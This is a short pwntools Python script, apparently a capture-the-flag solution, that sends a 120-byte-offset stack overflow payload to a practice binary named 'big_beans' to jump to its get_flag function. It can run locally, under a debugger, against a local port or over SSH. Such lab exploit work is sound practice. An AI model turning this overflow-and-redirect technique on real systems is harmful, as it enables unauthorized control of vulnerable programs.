#!/usr/bin/python3

from pwn import *

context.terminal = ['konsole','-e'] # replace this with your terminal of choice
#context.log_level = 'debug'
context.binary = './build/big_beans'

e = ELF('./build/big_beans')
rop = ROP('./build/big_beans')
if 'd' in sys.argv:
    p = e.debug()
elif 'r' in sys.argv:
    p = remote('localhost', 5500)
elif 's' in sys.argv:
    s = ssh(host='host', user='username', password='password')
    p = s.process('./build/big_beans', cwd='problemDir')
else:
    p = e.process()

payload = flat({120: e.sym['get_flag']})

p.sendline(payload)
p.interactive()
